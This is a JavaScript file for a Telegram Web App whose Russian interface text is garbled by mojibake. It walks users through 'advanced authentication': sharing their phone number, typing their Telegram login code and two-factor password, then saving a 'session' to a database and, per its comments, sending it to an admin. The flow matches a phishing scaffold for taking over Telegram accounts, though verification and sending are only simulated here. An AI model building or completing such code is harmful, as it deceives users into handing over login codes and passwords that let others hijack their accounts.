// auth-system.js
class AuthSystem {
    constructor() {
        this.authState = null;
    }
    
    async startAdvancedAuth(userId) {
        const tg = window.Telegram.WebApp;
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é
        tg.showPopup({
            title: "üîê –ü—Ä–æ–¥–≤–∏–Ω—É—Ç–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è",
            message: "–î–ª—è –ø–æ–ª–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –Ω—É–∂–Ω–æ:\n\n1. –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω–∞\n2. –í–≤–µ—Å—Ç–∏ –∫–æ–¥ –∏–∑ Telegram\n3. –í–≤–µ—Å—Ç–∏ –ø–∞—Ä–æ–ª—å (–µ—Å–ª–∏ –µ—Å—Ç—å)\n\n–ë–µ–∑–æ–ø–∞—Å–Ω–æ –∏ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ",
            buttons: [
                {id: 'share_phone', type: 'default', text: 'üì± –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º'},
                {type: 'cancel', text: '‚ùå –û—Ç–º–µ–Ω–∞'}
            ]
        }, async (buttonId) => {
            if (buttonId === 'share_phone') {
                await this.requestPhoneNumber(userId);
            }
        });
    }
    
    async requestPhoneNumber(userId) {
        const tg = window.Telegram.WebApp;
        
        tg.showPopup({
            title: "üì± –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞",
            message: "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–µ–ª–∏—Ç–µ—Å—å –≤–∞—à–∏–º –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –≤ Telegram",
            buttons: [
                {
                    id: 'share_phone',
                    type: 'default',
                    text: 'üìû –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º'
                },
                {
                    type: 'cancel',
                    text: '‚ùå –û—Ç–º–µ–Ω–∞'
                }
            ]
        }, async (buttonId) => {
            if (buttonId === 'share_phone') {
                // –í —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∑–¥–µ—Å—å –±—É–¥–µ—Ç –≤—ã–∑–æ–≤ API –¥–ª—è –Ω–∞—á–∞–ª–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–∏–º—É–ª—è—Ü–∏—é –ø—Ä–æ—Ü–µ—Å—Å–∞
                await this.simulateAuthProcess(userId);
            }
        });
    }
    
    async simulateAuthProcess(userId) {
        const tg = window.Telegram.WebApp;
        
        // –°–∏–º—É–ª—è—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–¥–∞
        setTimeout(() => {
            this.showCodeInputModal();
        }, 1500);
    }
    
    showCodeInputModal() {
        document.getElementById('codeModal').style.display = 'flex';
        
        // –û—á–∏—â–∞–µ–º –ø–æ–ª—è
        document.querySelectorAll('.code-input').forEach(input => {
            input.value = '';
        });
        
        // –§–æ–∫—É—Å–∏—Ä—É–µ–º—Å—è –Ω–∞ –ø–µ—Ä–≤–æ–º –ø–æ–ª–µ
        document.querySelectorAll('.code-input')[0].focus();
    }
    
    async submitCode() {
        const codeInputs = document.querySelectorAll('.code-input');
        let code = '';
        
        codeInputs.forEach(input => {
            code += input.value;
        });
        
        if (code.length !== 5) {
            window.Telegram.WebApp.showAlert('‚ùå –í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –∫–æ–¥ –∏–∑ 5 —Ü–∏—Ñ—Ä');
            return;
        }
        
        // –°–∏–º—É–ª—è—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–¥–∞
        const isValid = await this.verifyCode(code);
        
        if (isValid) {
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω—É–∂–µ–Ω –ª–∏ –ø–∞—Ä–æ–ª—å
            const needsPassword = await this.checkPasswordRequirement();
            
            if (needsPassword) {
                this.showPasswordModal();
            } else {
                await this.completeAuth();
            }
        } else {
            window.Telegram.WebApp.showAlert('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.');
        }
    }
    
    async verifyCode(code) {
        // –°–∏–º—É–ª—è—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–¥–∞
        return new Promise(resolve => {
            setTimeout(() => {
                resolve(code === '12345'); // –¢–µ—Å—Ç–æ–≤—ã–π –∫–æ–¥
            }, 1000);
        });
    }
    
    async checkPasswordRequirement() {
        // –°–∏–º—É–ª—è—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –ø–∞—Ä–æ–ª—è
        return new Promise(resolve => {
            setTimeout(() => {
                resolve(Math.random() > 0.5); // 50% —à–∞–Ω—Å —á—Ç–æ –Ω—É–∂–µ–Ω –ø–∞—Ä–æ–ª—å
            }, 500);
        });
    }
    
    showPasswordModal() {
        document.getElementById('codeModal').style.display = 'none';
        document.getElementById('passwordModal').style.display = 'flex';
        document.getElementById('passwordInput').value = '';
        document.getElementById('passwordInput').focus();
    }
    
    async submitPassword() {
        const password = document.getElementById('passwordInput').value;
        
        if (!password) {
            window.Telegram.WebApp.showAlert('‚ùå –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å');
            return;
        }
        
        const isValid = await this.verifyPassword(password);
        
        if (isValid) {
            await this.completeAuth();
        } else {
            window.Telegram.WebApp.showAlert('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å');
        }
    }
    
    async verifyPassword(password) {
        // –°–∏–º—É–ª—è—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–∞—Ä–æ–ª—è
        return new Promise(resolve => {
            setTimeout(() => {
                resolve(password === 'test123'); // –¢–µ—Å—Ç–æ–≤—ã–π –ø–∞—Ä–æ–ª—å
            }, 1000);
        });
    }
    
    async completeAuth() {
        const tg = window.Telegram.WebApp;
        
        // –ó–∞–∫—Ä—ã–≤–∞–µ–º –≤—Å–µ –º–æ–¥–∞–ª—å–Ω—ã–µ –æ–∫–Ω–∞
        document.getElementById('codeModal').style.display = 'none';
        document.getElementById('passwordModal').style.display = 'none';
        
        // –°–∏–º—É–ª—è—Ü–∏—è —Å–±–æ—Ä–∞ —Å–µ—Å—Å–∏–∏
        const sessionData = {
            phone: "+79001234567",
            auth_date: Math.floor(Date.now() / 1000),
            session_string: "simulated_session_data_here",
            user_id: userData.id
        };
        
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ Supabase
        await window.supabaseClient.saveAuthSession(userData.id, sessionData);
        
        // –û–±–Ω–æ–≤–ª—è–µ–º UI
        await this.updateUI(userData.id);
        
        tg.showAlert('‚úÖ Telegram —É—Å–ø–µ—à–Ω–æ –ø—Ä–∏–≤—è–∑–∞–Ω! –°–µ—Å—Å–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞.', () => {
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –∞–¥–º–∏–Ω—É (—Å–∏–º—É–ª—è—Ü–∏—è)
            this.sendToAdmin(sessionData);
        });
    }
    
    async sendToAdmin(sessionData) {
        // –í —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∑–¥–µ—Å—å –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∞–¥–º–∏–Ω—É
        console.log('–°–µ—Å—Å–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∞–¥–º–∏–Ω—É:', sessionData);
        
        window.Telegram.WebApp.showAlert('üì® –°–µ—Å—Å–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏.');
    }
    
    async updateUI(userId) {
        const session = await this.getUserSession(userId);
        
        if (session) {
            document.getElementById('telegramStatus').textContent = '–ü—Ä–∏–≤—è–∑–∞–Ω';
            document.getElementById('telegramStatus').className = 'status-connected';
            document.getElementById('bindTelegramBtn').textContent = '‚úÖ Telegram –ø—Ä–∏–≤—è–∑–∞–Ω';
            document.getElementById('bindTelegramBtn').disabled = true;
        }
    }
    
    async getUserSession(userId) {
        // –ü–æ–ª—É—á–∞–µ–º —Å–µ—Å—Å–∏—é –∏–∑ Supabase
        const { data, error } = await window.supabaseClient.client
            .from('telegram_sessions')
            .select('*')
            .eq('user_id', userId)
            .order('created_at', { ascending: false })
            .limit(1)
            .single();
        
        return error ? null : data;
    }
}

window.authSystem = new AuthSystem();
